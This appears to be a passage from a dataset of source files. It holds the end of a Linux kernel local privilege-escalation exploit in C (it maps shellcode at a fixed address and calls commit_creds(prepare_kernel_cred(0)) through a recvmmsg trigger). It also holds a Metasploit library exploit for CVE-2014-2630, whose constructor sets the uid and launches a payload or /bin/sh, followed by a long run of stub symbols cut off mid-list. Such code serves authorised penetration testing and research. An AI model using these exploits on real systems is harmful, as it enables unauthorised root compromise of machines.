__attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);\ntypedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);\n_commit_creds commit_creds;\n_prepare_kernel_cred prepare_kernel_cred;\n\n// thx bliss\nstatic int __attribute__((regparm(3)))\ngetroot(void *head, void * table)\n{\n    commit_creds(prepare_kernel_cred(0));\n    return -1;\n}\n\nvoid __attribute__((regparm(3)))\ntrampoline()\n{\n    asm(\"mov $getroot, %rax; call *%rax;\");\n}\n\nint main(void)\n{\n    int sockfd, retval, i;\n    struct sockaddr_in sa;\n    struct mmsghdr msgs[VLEN];\n    struct iovec iovecs[VLEN];\n    char buf[BUFSIZE];\n    long mmapped;\n    struct utsname u;\n    struct offset *off = NULL;\n\n    uname(&u);\n\n    for(i=0;offsets[i].kernel_version != NULL;i++) {\n        if(!strcmp(offsets[i].kernel_version,u.release)) {\n            off = &offsets[i];\n            break;\n        }\n    }\n\n    if(!off) {\n        fprintf(stderr,\"no offsets for this kernel version..\\n\");\n        exit(-1);\n    }\n\n    mmapped = (off->original_value  & ~(sysconf(_SC_PAGE_SIZE) - 1));\n    mmapped &= 0x000000ffffffffff;\n\n        srand(time(NULL));\n    port = (rand() % 30000)+1500;\n\n    commit_creds = (_commit_creds)off->commit_creds;\n    prepare_kernel_cred = (_prepare_kernel_cred)off->prepare_kernel_cred;\n\n    mmapped = (long)mmap((void *)mmapped, sysconf(_SC_PAGE_SIZE)*3, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);\n\n    if(mmapped == -1) {\n        perror(\"mmap()\");\n        exit(-1);\n    }\n\n    memset((char *)mmapped,0x90,sysconf(_SC_PAGE_SIZE)*3);\n\n    memcpy((char *)mmapped + sysconf(_SC_PAGE_SIZE), (char *)&trampoline, 300);\n\n    if(mprotect((void *)mmapped, sysconf(_SC_PAGE_SIZE)*3, PROT_READ|PROT_EXEC) != 0) {\n        perror(\"mprotect()\");\n        exit(-1);\n    }\n    \n    sockfd = socket(AF_INET, SOCK_DGRAM, 0);\n    if (sockfd == -1) {\n        perror(\"socket()\");\n        exit(-1);\n    }\n\n    sa.sin_family = AF_INET;\n    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);\n    sa.sin_port = htons(port);\n\n    if (bind(sockfd, (struct sockaddr *) &sa, sizeof(sa)) == -1) {\n        perror(\"bind()\");\n        exit(-1);\n    }\n\n    memset(msgs, 0, sizeof(msgs));\n\n    iovecs[0].iov_base = &buf;\n    iovecs[0].iov_len = BUFSIZE;\n    msgs[0].msg_hdr.msg_iov = &iovecs[0];\n    msgs[0].msg_hdr.msg_iovlen = 1;\n\n    for(i=0;i < 3 ;i++) {\n        udp(i);\n        retval = syscall(__NR_recvmmsg, sockfd, msgs, VLEN, 0, (void *)off->dest+7-i);\n        if(!retval) {\n            fprintf(stderr,\"\\nrecvmmsg() failed\\n\");\n        }\n    }\n\n    close(sockfd); \n\n    fprintf(stderr,\"\\n\");\n\n    trigger();\n}\n", "timestamp": "2025-10-24T23:39:29.428477"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2014-2630/CVE-2014-2630.c", "content": "#define _GNU_SOURCE\n#include <unistd.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <stdio.h>\n#include <dlfcn.h>\nvoid __cxa_finalize (void *d) {\n    return;\n}\nvoid __attribute__((constructor)) init() {\n    setresuid(geteuid(), geteuid(), geteuid());\n    execl(\"#{payload_path}\", (char *)NULL, (char *)NULL);\n    execl(\"/bin/sh\", (char *)NULL, (char *)NULL);\n}\nint applicationShellClassRec = 0;\nint applicationShellWidgetClass = 0;\nint colorConvertArgs = 0;\nint compositeWidgetClass = 0;\nint constraintClassRec = 0;\nint constraintWidgetClass = 0;\nint coreWidgetClass = 0;\nint dump_external = 0;\nint dump_fontlist = 0;\nint dump_fontlist_cache = 0;\nint dump_internal = 0;\nint FcPatternAddInteger = 0;\nint FcPatternAddString = 0;\nint FcPatternCreate = 0;\nint FcPatternDestroy = 0;\nint GetWidgetNavigPtrs = 0;\nint InitializeScrollBars = 0;\nint _ITM_deregisterTMCloneTable = 0;\nint _ITM_registerTMCloneTable = 0;\nint jpeg_calc_output_dimensions = 0;\nint jpeg_CreateDecompress = 0;\nint jpeg_destroy_decompress = 0;\nint jpeg_finish_decompress = 0;\nint jpeg_read_header = 0;\nint jpeg_read_scanlines = 0;\nint jpeg_start_decompress = 0;\nint jpeg_std_error = 0;\nint jpeg_stdio_src = 0;\nint load_jpeg = 0;\nint localeconv = 0;\nint __longjmp_chk = 0;\nint nl_langinfo = 0;\nint NumLockMask = 0;\nint objectClass = 0;\nint objectClassRec = 0;\nint overrideShellClassRec = 0;\nint png_create_info_struct = 0;\nint png_create_read_struct = 0;\nint png_destroy_read_struct = 0;\nint png_get_channels = 0;\nint png_get_gAMA = 0;\nint png_get_IHDR = 0;\nint png_get_rowbytes = 0;\nint png_get_valid = 0;\nint png_init_io = 0;\nint png_read_end = 0;\nint png_read_image = 0;\nint png_read_info = 0;\nint png_read_update_info = 0;\nint png_set_expand = 0;\nint png_set_gamma = 0;\nint png_set_gray_to_rgb = 0;\nint png_set_longjmp_fn = 0;\nint png_set_sig_bytes = 0;\nint png_set_strip_16 = 0;\nint png_sig_cmp = 0;\nint rectObjClass = 0;\nint rectObjClassRec = 0;\nint ScrollLockMask = 0;\nint SetMwmStuff = 0;\nint T = 0;\nint topLevelShellWidgetClass = 0;\nint transientShellClassRec = 0;\nint transientShellWidgetClass = 0;\nint V = 0;\nint vendorShellClassRec = 0;\nint vendorShellWidgetClass = 0;\nint W = 0;\nint __wctomb_chk = 0;\nint widgetClass = 0;\nint widgetClassRec = 0;\nint wmShellClassRec = 0;\nint wmShellWidgetClass = 0;\nint XAddExtension = 0;\nint XAllocColor = 0;\nint XAllocColorCells = 0;\nint XAllowEvents = 0;\nint XBell = 0;\nint XChangeActivePointerGrab = 0;\nint XChangeGC = 0;\nint XChangeProperty = 0;\nint XChangeWindowAttributes = 0;\nint XCheckIfEvent = 0;\nint XCheckMaskEvent = 0;\nint XClearArea = 0;\nint XClearWindow = 0;\nint XCloseDisplay = 0;\nint XCloseIM = 0;\nint XConfigureWindow = 0;\nint XConvertSelection = 0;\nint XCopyArea = 0;\nint XCopyPlane = 0;\nint XCreateBitmapFromData = 0;\nint XCreateFontCursor = 0;\nint XCreateGC = 0;\nint XCreateIC = 0;\nint XCreateImage = 0;\nint XCreatePixmap = 0;\nint XCreatePixmapCursor = 0;\nint XCreatePixmapFromBitmapData = 0;\nint XCreateRegion = 0;\nint XCreateWindow = 0;\nint XDefaultColormap = 0;\nint XDefaultDepth = 0;\nint XDefaultScreen = 0;\nint XDefaultVisual = 0;\nint XDefineCursor = 0;\nint XDeleteContext = 0;\nint XDeleteProperty = 0;\nint XDestroyIC = 0;\nint XDestroyRegion = 0;\nint XDestroyWindow = 0;\nint XDisplayKeycodes = 0;\nint XDisplayOfScreen = 0;\nint XDisplayString = 0;\nint XDrawArc = 0;\nint XDrawImageString = 0;\nint XDrawImageString16 = 0;\nint XDrawLine = 0;\nint XDrawLines = 0;\nint XDrawPoint = 0;\nint XDrawRectangle = 0;\nint XDrawSegments = 0;\nint XDrawString = 0;\nint XDrawString16 = 0;\nint _XEditResGet16 = 0;\nint _XEditResGet32 = 0;\nint _XEditResGet8 = 0;\nint _XEditResGetSigned16 = 0;\nint _XEditResGetString8 = 0;\nint _XEditResGetWidgetInfo = 0;\nint _XEditResPut16 = 0;\nint _XEditResPut32 = 0;\nint _XEditResPut8 = 0;\nint _XEditResPutString8 = 0;\nint _XEditResPutWidgetInfo = 0;\nint _XEditResResetStream = 0;\nint XEmptyRegion = 0;\nint XEqualRegion = 0;\nint XESetCloseDisplay = 0;\nint XExtentsOfFontSet = 0;\nint XFetchBuffer = 0;\nint XFillArc = 0;\nint XFillPolygon = 0;\nint XFillRectangle = 0;\nint XFillRectangles = 0;\nint XFindContext = 0;\nint XFlush = 0;\nint XFontsOfFontSet = 0;\nint XFree = 0;\nint XFreeColors = 0;\nint XFreeCursor = 0;\nint XFreeFont = 0;\nint XFreeFontNames = 0;\nint XFreeGC = 0;\nint XFreeModifiermap = 0;\nint XFreePixmap = 0;\nint XFreeStringList = 0;\nint XftDrawCreate = 0;\nint XftDrawCreateBitmap = 0;\nint XftDrawDestroy = 0;\nint XftDrawRect = 0;\nint XftDrawSetClip = 0;\nint XftDrawSetClipRectangles = 0;\nint XftDrawString16 = 0;\nint XftDrawString32 = 0;\nint XftDrawStringUtf8 = 0;\nint XftFontClose = 0;\nint XftFontMatch = 0;\nint XftFontOpenPattern = 0;\nint XftTextExtents16 = 0;\nint XftTextExtents32 = 0;\nint XftTextExtents8 = 0;\nint XftTextExtentsUtf8 = 0;\nint XGetAtomName = 0;\nint XGetFontProperty = 0;\nint XGetGCValues = 0;\nint XGetGeometry = 0;\nint XGetICValues = 0;\nint XGetImage = 0;\nint XGetIMValues = 0;\nint XGetInputFocus = 0;\nint XGetKeyboardMapping = 0;\nint XGetModifierMapping = 0;\nint XGetOCValues = 0;\nint XGetOMValues = 0;\nint XGetSelectionOwner = 0;\nint XGetWindowAttributes = 0;\nint XGetWindowProperty = 0;\nint XGetWMColormapWindows = 0;\nint XGrabKeyboard = 0;\nint XGrabPointer = 0;\nint XGrabServer = 0;\nint XHeightOfScreen = 0;\nint xiColumnConstraintExtension = 0;\nint XiCreateStippledPixmap = 0;\nint _XiGetTabIndex = 0;\nint XIMOfIC = 0;\nint XInstallColormap = 0;\nint XInternAtom = 0;\nint XInternAtoms = 0;\nint XIntersectRegion = 0;\nint XiReleaseStippledPixmap = 0;\nint _XiResolveAllPartOffsets = 0;\nint XiResolveAllPartOffsets = 0;\nint XKeysymToKeycode = 0;\nint XKeysymToString = 0;\nint XLastKnownRequestProcessed = 0;\nint XListFonts = 0;\nint XListInstalledColormaps = 0;\nint XLoadQueryFont = 0;\nint XLookupString = 0;\nint Xm18IListUnselectAllItems = 0;\nint Xm18IListUnselectItem = 0;\nint _XmAccessColorData = 0;\nint XmActivateProtocol = 0;\nint _XmAddCallback = 0;\nint _XmAddGrab = 0;\nint _XmAddHashEntry = 0;\nint XmAddProtocolCallback = 0;\nint XmAddProtocols = 0;\nint _Xm_AddQueue = 0;\nint XmAddTabGroup = 0;\nint _XmAddTearOffEventHandlers = 0;\nint _XmAddToColorCache = 0;\nint XmAddToPostFromList = 0;\nint _XmAllocHashTable = 0;\nint _XmAllocMotifAtom = 0;\nint _XmAllocReceiverInfo = 0;\nint _XmAllocScratchPixmap = 0;\nint _XmAllowAcceleratedInsensitiveUnmanagedMenuItems = 0;\nint XMapRaised = 0;\nint XMapWindow = 0;\nint _XmArrowB_defaultTranslations = 0;\nint xmArrowButtonClassRec = 0;\nint xmArrowButtonGadgetClass = 0;\nint xmArrowButtonGadgetClassRec = 0;\nint xmArrowButtonWidgetClass = 0;\nint _XmArrowPixmapCacheCompare = 0;\nint _XmArrowPixmapCacheDelete = 0;\nint _XmAssignInsensitiveColor = 0;\nint _XmAssignLabG_MarginBottom = 0;\nint _XmAssignLabG_MarginHeight = 0;\nint _XmAssignLabG_MarginLeft = 0;\nint _XmAssignLabG_MarginRight = 0;\nint _XmAssignLabG_MarginTop = 0;\nint _XmAssignLabG_MarginWidth = 0;\nint XMaxRequestSize = 0;\nint _XmBackgroundColorDefault = 0;\nint _XmBaseClassPartInitialize = 0;\nint _XmBB_CreateButtonG = 0;\nint _XmBB_CreateLabelG = 0;\nint _XmBB_GetDialogTitle = 0;\nint _XmBBUpdateDynDefaultButton = 0;\nint XmbDrawImageString = 0;\nint XmbDrawString = 0;\nint _XmBlackPixel = 0;\nint XmbLookupString = 0;\nint _XmBottomShadowColorDefault = 0;\nint XmbResetIC = 0;\nint XmbTextEscapement = 0;\nint XmbTextExtents = 0;\nint XmbTextListToTextProperty = 0;\nint XmbTextPropertyToTextList = 0;\nint _XmBuildExtResources = 0;\nint _XmBuildGadgetResources = 0;\nint _XmBuildManagerResources = 0;\nint _XmBuildPrimitiveResources = 0;\nint _XmBuildResources = 0;\nint _XmBulletinB_defaultTranslations = 0;\nint _XmBulletinBoardCancel = 0;\nint xmBulletinBoardClassRec = 0;\nint _XmBulletinBoardFocusMoved = 0;\nint _XmBulletinBoardMap = 0;\nint _XmBulletinBoardReturn = 0;\nint _XmBulletinBoardSetDefaultShadow = 0;\nint _XmBulletinBoardSetDynDefaultButton = 0;\nint _XmBulletinBoardSizeUpdate = 0;\nint xmBulletinBoardWidgetClass = 0;\nint xmButtonBoxClassRec = 0;\nint xmButtonBoxWidgetClass = 0;\nint _XmButtonPopdownChildren = 0;\nint _XmButtonTakeFocus = 0;\nint _XmByteOrderChar = 0;\nint _XmCacheCopy = 0;\nint _XmCacheDelete = 0;\nint _XmCachePart = 0;\nint _XmCachePixmap = 0;\nint _XmCalcLabelDimensions = 0;\nint _XmCalcLabelGDimensions = 0;\nint _XmCallCallbackList = 0;\nint _XmCallFocusMoved = 0;\nint _XmCallRowColumnMapCallback = 0;\nint _XmCallRowColumnUnmapCallback = 0;\nint _XmCascadeB_menubar_events = 0;\nint _XmCascadeB_p_events = 0;\nint _XmCascadeBPrimClassExtRec = 0;\nint xmCascadeButtonClassRec = 0;\nint xmCascadeButtonGadgetClass = 0;\nint xmCascadeButtonGadgetClassRec = 0;\nint XmCascadeButtonGadgetHighlight = 0;\nint xmCascadeButtonGCacheObjClassRec = 0;\nint XmCascadeButtonHighlight = 0;\nint xmCascadeButtonWidgetClass = 0;\nint _XmCascadingPopup = 0;\nint _XmCBHelp = 0;\nint _XmCBNameActivate = 0;\nint _XmCBNameValueChanged = 0;\nint XmChangeColor = 0;\nint _XmChangeHSB = 0;\nint _XmChangeNavigationType = 0;\nint _XmChangeVSB = 0;\nint _XmCharsetCanonicalize = 0;\nint _XmCleanPixmapCache = 0;\nint _XmClearBCompatibility = 0;\nint _XmClearBGCompatibility = 0;\nint _XmClearBGPixmapName = 0;\nint _XmClearBorder = 0;\nint _XmClearDisplayTables = 0;\nint _XmClearDragReceiverInfo = 0;\nint _XmClearFocusPath = 0;\nint _XmClearIconPixmapName = 0;\nint _XmClearKbdFocus = 0;\nint _XmClearRect = 0;\nint _XmClearShadowType = 0;\nint _XmClearTabGroup = 0;\nint _XmClearTraversal = 0;\nint XmClipboardBeginCopy = 0;\nint XmClipboardCancelCopy = 0;\nint XmClipboardCopy = 0;\nint XmClipboardCopyByName = 0;\nint XmClipboardEndCopy = 0;\nint XmClipboardEndRetrieve = 0;\nint XmClipboardInquireCount = 0;\nint XmClipboardInquireFormat = 0;\nint XmClipboardInquireLength = 0;\nint XmClipboardInquirePendingItems = 0;\nint XmClipboardLock = 0;\nint _XmClipboardPassType = 0;\nint XmClipboardRegisterFormat = 0;\nint XmClipboardRetrieve = 0;\nint XmClipboardStartCopy = 0;\nint XmClipboardStartRetrieve = 0;\nint XmClipboardUndoCopy = 0;\nint XmClipboardUnlock = 0;\nint XmClipboardWithdrawFormat = 0;\nint xmClipWindowClassRec = 0;\nint _XmClipWindowTranslationTable = 0;\nint xmClipWindowWidgetClass = 0;\nint _XmColorObjCache = 0;\nint _XmColorObjCacheDisplay = 0;\nint xmColorObjClass = 0;\nint xmColorObjClassRec = 0;\nint _XmColorObjCreate = 0;\nint xmColorSelectorClassRec = 0;\nint xmColorSelectorWidgetClass = 0;\nint xmColumnClassRec = 0;\nint xmColumnWidgetClass = 0;\nint xmCombinationBox2ClassRec = 0;\nint XmCombinationBox2GetArrow = 0;\nint XmCombinationBox2GetChild = 0;\nint XmCombinationBox2GetLabel = 0;\nint XmCombinationBox2GetList = 0;\nint XmCombinationBox2GetText = 0;\nint XmCombinationBox2GetValue = 0;\nint xmCombinationBox2WidgetClass = 0;\nint XmCombinationBoxGetValue = 0;\nint XmComboBoxAddItem = 0;\nint xmComboBoxClassRec = 0;\nint _XmComboBox_defaultAccelerators = 0;\nint _XmComboBox_defaultTranslations = 0;\nint XmComboBoxDeletePos = 0;\nint _XmComboBox_dropDownComboBoxAccelerators = 0;\nint _XmComboBox_dropDownListTranslations = 0;\nint XmComboBoxSelectItem = 0;\nint XmComboBoxSetItem = 0;\nint _XmComboBox_textFocusTranslations = 0;\nint XmComboBoxUpdate = 0;\nint xmComboBoxWidgetClass = 0;\nint XmCommandAppendValue = 0;\nint xmCommandClassRec = 0;\nint XmCommandError = 0;\nint XmCommandGetChild = 0;\nint _XmCommandReturn = 0;\nint XmCommandSetValue = 0;\nint _XmCommandUpOrDown = 0;\nint xmCommandWidgetClass = 0;\nint XmCompareISOLatin1 = 0;\nint XmCompareXtWidgetGeometry = 0;\nint XmCompareXtWidgetGeometryToWidget = 0;\nint _XmComputeVisibilityRect = 0;\nint _XmConfigureObject = 0;\nint _XmConfigureWidget = 0;\nint xmContainerClassRec = 0;\nint XmContainerCopy = 0;\nint XmContainerCopyLink = 0;\nint XmContainerCut = 0;\nint _XmContainer_defaultTranslations = 0;\nint XmContainerGetItemChildren = 0;\nint XmContainerPaste = 0;\nint XmContainerPasteLink = 0;\nint XmContainerRelayout = 0;\nint XmContainerReorder = 0;\nint _XmContainer_traversalTranslations = 0;\nint xmContainerWidgetClass = 0;\nint _XmConvertActionParamToRepTypeId = 0;\nint _XmConvertComplete = 0;\nint _XmConvertCSToString = 0;\nint _XmConvertFactor = 0;\nint _XmConvertFloatUnitsToIntUnits = 0;\nint _XmConvertHandler = 0;\nint _XmConvertHandlerSetLocal = 0;\nint _XmConvertStringToUnits = 0;\nint XmConvertStringToUnits = 0;\nint _XmConvertToBW = 0;\nint _XmConvertUnits = 0;\nint XmConvertUnits = 0;\nint _XmCopyCursorIconQuark = 0;\nint XmCopyISOLatin1Lowered = 0;\nint _XmCountVaList = 0;\nint XmCreateArrowButton = 0;\nint XmCreateArrowButtonGadget = 0;\nint _XmCreateArrowPixmaps = 0;\nint XmCreateBulletinBoard = 0;\nint XmCreateBulletinBoardDialog = 0;\nint XmCreateButtonBox = 0;\nint XmCreateCascadeButton = 0;\nint XmCreateCascadeButtonGadget = 0;\nint XmCreateColorSelector = 0;\nint XmCreateColumn = 0;\nint XmCreateCombinationBox2 = 0;\nint XmCreateComboBox = 0;\nint XmCreateCommand = 0;\nint XmCreateCommandDialog = 0;\nint XmCreateContainer = 0;\nint XmCreateDataField = 0;\nint XmCreateDialogShell = 0;\nint XmCreateDragIcon = 0;\nint XmCreateDrawingArea = 0;\nint XmCreateDrawnButton = 0;\nint XmCreateDropDown = 0;\nint XmCreateDropDownComboBox = 0;\nint XmCreateDropDownList = 0;\nint XmCreateErrorDialog = 0;\nint XmCreateExt18List = 0;\nint XmCreateExtended18List = 0;\nint XmCreateFileSelectionBox = 0;\nint XmCreateFileSelectionDialog = 0;\nint _XmCreateFocusData = 0;\nint XmCreateFontSelector = 0;\nint XmCreateForm = 0;\nint XmCreateFormDialog = 0;\nint XmCreateFrame = 0;\nint XmCreateGrabShell = 0;\nint XmCreateIconBox = 0;\nint XmCreateIconButton = 0;\nint XmCreateIconGadget = 0;\nint XmCreateIconHeader = 0;\nint XmCreateInformationDialog = 0;\nint XmCreateLabel = 0;\nint XmCreateLabelGadget = 0;\nint XmCreateList = 0;\nint XmCreateMainWindow = 0;\nint XmCreateMenuBar = 0;\nint _XmCreateMenuCursor = 0;\nint XmCreateMenuShell = 0;\nint XmCreateMessageBox = 0;\nint XmCreateMessageDialog = 0;\nint XmCreateMultiList = 0;\nint XmCreateNotebook = 0;\nint XmCreateOptionMenu = 0;\nint XmCreateOutline = 0;\nint XmCreatePaned = 0;\nint XmCreatePanedWindow = 0;\nint XmCreatePopupMenu = 0;\nint XmCreatePromptDialog = 0;\nint XmCreatePulldownMenu = 0;\nint XmCreatePushButton = 0;\nint XmCreatePushButtonGadget = 0;\nint XmCreateQuestionDialog = 0;\nint XmCreateRadioBox = 0;\nint _XmCreateRenderTable = 0;\nint _XmCreateRendition = 0;\nint XmCreateRowColumn = 0;\nint XmCreateScale = 0;\nint XmCreateScrollBar = 0;\nint XmCreateScrolledList = 0;\nint XmCreateScrolledText = 0;\nint XmCreateScrolledWindow = 0;\nint XmCreateSelectionBox = 0;\nint XmCreateSelectionDialog = 0;\nint XmCreateSeparator = 0;\nint XmCreateSeparatorGadget = 0;\nint XmCreateSimpleCheckBox = 0;\nint XmCreateSimpleMenuBar = 0;\nint XmCreateSimpleOptionMenu = 0;\nint XmCreateSimplePopupMenu = 0;\nint XmCreateSimplePulldownMenu = 0;\nint XmCreateSimpleRadioBox = 0;\nint XmCreateSimpleSpinBox = 0;\nint XmCreateSpinBox = 0;\nint _XmCreateTab = 0;\nint XmCreateTabBox = 0;\nint _XmCreateTabList = 0;\nint XmCreateTabStack = 0;\nint XmCreateTemplateDialog = 0;\nint XmCreateText = 0;\nint XmCreateTextField = 0;\nint XmCreateToggleButton = 0;\nint XmCreateToggleButtonGadget = 0;\nint XmCreateTree = 0;\nint _XmCreateVisibilityRect = 0;\nint XmCreateWarningDialog = 0;\nint XmCreateWorkArea = 0;\nint XmCreateWorkingDialog = 0;\nint XmCvtByteStreamToXmString = 0;\nint XmCvtCTToXmString = 0;\nint XmCvtFromHorizontalPixels = 0;\nint XmCvtFromVerticalPixels = 0;\nint XmCvtStringToUnitType = 0;\nint XmCvtTextPropertyToXmStringTable = 0;\nint XmCvtTextToXmString = 0;\nint XmCvtToHorizontalPixels = 0;\nint XmCvtToVerticalPixels = 0;\nint XmCvtXmStringTableToTextProperty = 0;\nint XmCvtXmStringToByteStream = 0;\nint _XmCvtXmStringToCT = 0;\nint XmCvtXmStringToCT = 0;\nint XmCvtXmStringToText = 0;\nint _XmCvtXmStringToUTF8String = 0;\nint XmCvtXmStringToUTF8String = 0;\nint _XmDataF_EventBindings1 = 0;\nint _XmDataF_EventBindings2 = 0;\nint _XmDataF_EventBindings3 = 0;\nint _XmDataF_EventBindings4 = 0;\nint xmDataFieldClassRec = 0;\nint _XmDataFieldConvert = 0;\nint XmDataFieldCopy = 0;\nint _XmDataFieldCountBytes = 0;\nint XmDataFieldCut = 0;\nint _XmDataFieldDeselectSelection = 0;\nint XmDataFielddf_ClearSelection = 0;\nint _XmDataFielddf_SetCursorPosition = 0;\nint XmDataFielddf_SetCursorPosition = 0;\nint _XmDataFielddf_SetDestination = 0;\nint _XmDataFieldDrawInsertionPoint = 0;\nint XmDataFieldGetAddMode = 0;\nint XmDataFieldGetBaseline = 0;\nint XmDataFieldGetCursorPosition = 0;\nint _XmDataFieldGetDropReciever = 0;\nint XmDataFieldGetEditable = 0;\nint XmDataFieldGetInsertionPosition = 0;\nint XmDataFieldGetLastPosition = 0;\nint XmDataFieldGetMaxLength = 0;\nint XmDataFieldGetSelection = 0;\nint XmDataFieldGetSelectionPosition = 0;\nint XmDataFieldGetSelectionWcs = 0;\nint XmDataFieldGetString = 0;\nint XmDataFieldGetStringWcs = 0;\nint XmDataFieldGetSubstring = 0;\nint XmDataFieldGetSubstringWcs = 0;\nint XmDataFieldInsert = 0;\nint XmDataFieldInsertWcs = 0;\nint _XmDataFieldLoseSelection = 0;\nint XmDataFieldPaste = 0;\nint XmDataFieldPosToXY = 0;\nint XmDataFieldRemove = 0;\nint XmDataFieldReplace = 0;\nint _XmDataFieldReplaceText = 0;\nint XmDataFieldReplaceWcs = 0;\nint XmDataFieldSetAddMode = 0;\nint _XmDataFieldSetClipRect = 0;\nint XmDataFieldSetEditable = 0;\nint XmDataFieldSetHighlight = 0;\nint XmDataFieldSetInsertionPosition = 0;\nint XmDataFieldSetMaxLength = 0;\nint _XmDataFieldSetSel2 = 0;\nint XmDataFieldSetSelection = 0;\nint XmDataFieldSetString = 0;\nint XmDataFieldShowPosition = 0;\nint _XmDataFieldStartSelection = 0;\nint xmDataFieldWidgetClass = 0;\nint XmDataFieldXYToPos = 0;\nint _XmDataFPrimClassExtRec = 0;\nint _XmDataFToggleCursorGC = 0;\nint XmDeactivateProtocol = 0;\nint _XmDefaultColorObj = 0;\nint _XmDefaultDragIconQuark = 0;\nint _XmdefaultTextActionsTable = 0;\nint _XmdefaultTextActionsTableSize = 0;\nint _XmDefaultVisualResources = 0;\nint xmDesktopClass = 0;\nint xmDesktopClassRec = 0;\nint xmDesktopObjectClass = 0;\nint _XmDestinationHandler = 0;\nint _XmDestroyDefaultDragIcon = 0;\nint _XmDestroyFocusData = 0;\nint _XmDestroyMotifWindow = 0;\nint _XmDestroyParentCallback = 0;\nint XmDestroyPixmap = 0;\nint _XmDestroyTearOffShell = 0;\nint xmDialogShellClassRec = 0;\nint xmDialogShellExtClassRec = 0;\nint xmDialogShellExtObjectClass = 0;\nint xmDialogShellWidgetClass = 0;\nint _XmDifferentBackground = 0;\nint _XmDirectionDefault = 0;\nint XmDirectionMatch = 0;\nint XmDirectionMatchPartial = 0;\nint XmDirectionToStringDirection = 0;\nint _XmDismissTearOff = 0;\nint _XmDispatchGadgetInput = 0;\nint _XmDisplay_baseTranslations = 0;\nint xmDisplayClass = 0;\nint xmDisplayClassRec = 0;\nint xmDisplayObjectClass = 0;\nint _XmDoGadgetTraversal = 0;\nint XmDragCancel = 0;\nint _XmDragC_defaultTranslations = 0;\nint xmDragContextClass = 0;\nint xmDragContextClassRec = 0;\nint xmDragIconClassRec = 0;\nint _XmDragIconClean = 0;\nint _XmDragIconIsDirty = 0;\nint xmDragIconObjectClass = 0;\nint _XmDragOverChange = 0;\nint _XmDragOverFinish = 0;\nint _XmDragOverGetActiveCursor = 0;\nint _XmDragOverHide = 0;\nint _XmDragOverMove = 0;\nint _XmDragOverSetInitialPosition = 0;\nint xmDragOverShellClassRec = 0;\nint xmDragOverShellWidgetClass = 0;\nint _XmDragOverShow = 0;\nint XmDragStart = 0;\nint _XmDragUnderAnimation = 0;\nint _XmDrawArrow = 0;\nint XmDrawBevel = 0;\nint _XmDrawBorder = 0;\nint _XmDrawDiamond = 0;\nint _XmDrawDiamondButton = 0;\nint _XmDrawHighlight = 0;\nint _XmDrawingA_defaultTranslations = 0;\nint xmDrawingAreaClassRec = 0;\nint _XmDrawingAreaInput = 0;\nint xmDrawingAreaWidgetClass = 0;\nint _XmDrawingA_traversalTranslations = 0;\nint _XmDrawnB_defaultTranslations = 0;\nint _XmDrawnB_menuTranslations = 0;\nint _XmDrawnBPrimClassExtRec = 0;\nint xmDrawnButtonClassRec = 0;\nint xmDrawnButtonWidgetClass = 0;\nint _XmDrawSeparator = 0;\nint _XmDrawShadow = 0;\nint _XmDrawShadows = 0;\nint _XmDrawShadowType = 0;\nint _XmDrawSimpleHighlight = 0;\nint _XmDrawSquareButton = 0;\nint xmDropDownClassRec = 0;\nint XmDropDownGetArrow = 0;\nint XmDropDownGetChild = 0;\nint XmDropDownGetLabel = 0;\nint XmDropDownGetList = 0;\nint XmDropDownGetText = 0;\nint XmDropDownGetValue = 0;\nint xmDropDownWidgetClass = 0;\nint XmDropSiteConfigureStackingOrder = 0;\nint XmDropSiteEndUpdate = 0;\nint XmDropSiteGetActiveVisuals = 0;\nint xmDropSiteManagerClassRec = 0;\nint xmDropSiteManagerObjectClass = 0;\nint XmDropSiteQueryStackingOrder = 0;\nint XmDropSiteRegister = 0;\nint XmDropSiteRegistered = 0;\nint XmDropSiteRetrieve = 0;\nint _XmDropSiteShell = 0;\nint XmDropSiteStartUpdate = 0;\nint XmDropSiteUnregister = 0;\nint XmDropSiteUpdate = 0;\nint _XmDropSiteWrapperCandidate = 0;\nint XmDropTransferAdd = 0;\nint xmDropTransferClassRec = 0;\nint xmDropTransferObjectClass = 0;\nint XmDropTransferStart = 0;\nint _XmDSIAddChild = 0;\nint _XmDSIDestroy = 0;\nint _XmDSIGetBorderWidth = 0;\nint _XmDSIGetChildPosition = 0;\nint _XmDSIRemoveChild = 0;\nint _XmDSIReplaceChild = 0;\nint _XmDSISwapChildren = 0;\nint _XmDSMGetTreeFromDSM = 0;\nint _XmDSMUpdate = 0;\nint _XmDSResources = 0;\nint XmeAddFocusChangeCallback = 0;\nint XmeClearBorder = 0;\nint XmeClipboardSink = 0;\nint XmeClipboardSource = 0;\nint XmeConfigureObject = 0;\nint XmeConvertMerge = 0;\nint XmeCountVaListSimple = 0;\nint XmeCreateClassDialog = 0;\nint _XmEditResCheckMessages = 0;\nint XmeDragSource = 0;\nint XmeDrawArrow = 0;\nint XmeDrawCircle = 0;\nint XmeDrawDiamond = 0;\nint XmeDrawHighlight = 0;\nint XmeDrawIndicator = 0;\nint XmeDrawPolygonShadow = 0;\nint XmeDrawSeparator = 0;\nint XmeDrawShadows = 0;\nint XmeDropSink = 0;\nint XmeFlushIconFileCache = 0;\nint XmeFocusIsInShell = 0;\nint XmeFromHorizontalPixels = 0;\nint XmeFromVerticalPixels = 0;\nint XmeGetColorObjData = 0;\nint XmeGetDefaultPixel = 0;\nint XmeGetDefaultRenderTable = 0;\nint XmeGetDesktopColorCells = 0;\nint XmeGetDirection = 0;\nint XmeGetEncodingAtom = 0;\nint XmeGetHomeDirName = 0;\nint XmeGetIconControlInfo = 0;\nint XmeGetLocalizedString = 0;\nint XmeGetMask = 0;\nint XmeGetNextCharacter = 0;\nint XmeGetNullCursor = 0;\nint XmeGetPixelData = 0;\nint XmeGetPixmapData = 0;\nint XmeGetTextualDragIcon = 0;\nint XmeMicroSleep = 0;\nint _XmEmptyRect = 0;\nint XmeNamedSink = 0;\nint XmeNamedSource = 0;\nint XmeNamesAreEqual = 0;\nint XmeNavigChangeManaged = 0;\nint _XmEnterGadget = 0;\nint _XmEnterRowColumn = 0;\nint _XmEntryByteCountGet = 0;\nint _XmEntryCacheGet = 0;\nint _XmEntryCharCountGet = 